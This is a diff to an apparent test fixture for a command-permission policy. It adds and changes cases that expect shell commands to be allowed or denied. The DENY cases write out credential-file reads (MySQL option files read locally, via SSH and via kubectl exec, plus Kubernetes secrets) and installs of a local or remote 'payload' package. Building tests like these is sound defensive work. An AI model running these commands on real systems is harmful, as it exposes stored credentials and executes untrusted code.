@@ -183,11 +183,11 @@
   expect: ALLOW
   reason: "Restarting a named workload is bounded administration."
 
-- id: safe-kubectl-set-image
+- id: safe-deny-kubectl-set-image
   mode: safe
   command: ["kubectl", "set", "image", "deployment/api", "api=registry.example/api:v2", "-n", "prod"]
-  expect: ALLOW
-  reason: "Changing the image on a named workload is normal deployment administration."
+  expect: DENY
+  reason: "The mutable image tag selects remote executable content that is not visible in the command."
 
 - id: safe-kubectl-patch-configmap
   mode: safe
@@ -303,6 +303,24 @@
   expect: DENY
   reason: "Password hashes are credential material."
 
+- id: safe-deny-mysql-credential-read
+  mode: safe
+  command: ["cat", "/etc/mysql/debian.cnf"]
+  expect: DENY
+  reason: "MySQL option files can contain stored database credentials."
+
+- id: safe-deny-ssh-mysql-credential-read
+  mode: safe
+  command: ["ssh", "db01", "cat", "/etc/my.cnf"]
+  expect: DENY
+  reason: "Transporting the read through SSH does not make a credential file safe."
+
+- id: safe-deny-kubectl-mysql-credential-read
+  mode: safe
+  command: ["kubectl", "-n", "app", "exec", "deploy/api", "--", "cat", "/root/.my.cnf"]
+  expect: DENY
+  reason: "Reading a database credential file inside a container is credential access."
+
 - id: safe-deny-kubernetes-secret-read
   mode: safe
   command: ["kubectl", "-n", "app", "get", "secret", "api-credentials", "-o", "yaml"]
@@ -374,11 +392,11 @@
   expect: DENY
   reason: "The changes are defined in the playbook and inventory, not the command text; the effect is invisible and the fan-out unbounded."
 
-- id: safe-iac-plan
+- id: safe-deny-iac-plan
   mode: safe
   command: ["terraform", "plan"]
-  expect: ALLOW
-  reason: "A plan is a preview that changes nothing."
+  expect: DENY
+  reason: "The configuration, providers, and data sources are opaque and can execute during planning."
 
 - id: safe-deny-iac-apply
   mode: safe
@@ -421,6 +439,24 @@
   command: ["journalctl", "-u", "app", "--no-pager", "-n", "200"]
   expect: ALLOW
   reason: "Bounded local log inspection is normal host debugging."
+
+- id: safe-package-install-configured-repository
+  mode: safe
+  command: ["apt-get", "install", "curl"]
+  expect: ALLOW
+  reason: "A named package from an already configured repository is bounded administration."
+
+- id: safe-deny-local-package-artifact
+  mode: safe
+  command: ["apt-get", "install", "./payload.deb"]
+  expect: DENY
+  reason: "The local package artifact contains executable installation behavior that is not visible in the command."
+
+- id: safe-deny-remote-package-artifact
+  mode: safe
+  command: ["pip", "install", "https://example.invalid/payload.whl"]
+  expect: DENY
+  reason: "The URL selects remote executable package content that is not visible in the command."
 
 - id: safe-deny-systemd-unit-execstart-edit
   mode: safe
